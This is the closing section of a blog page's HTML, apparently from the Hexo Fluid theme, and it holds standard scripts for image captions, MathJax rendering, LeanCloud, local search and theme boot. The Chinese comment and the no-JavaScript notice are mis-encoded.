  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- ‰∏ªÈ¢òÁöÑÂêØÂä®È°πÔºåÂ∞ÜÂÆÉ‰øùÊåÅÂú®ÊúÄÂ∫ïÈÉ® -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">ÂçöÂÆ¢Âú®ÂÖÅËÆ∏ JavaScript ËøêË°åÁöÑÁéØÂ¢É‰∏ãÊµèËßàÊïàÊûúÊõ¥‰Ω≥</div>
  </noscript>
</body>
</html>
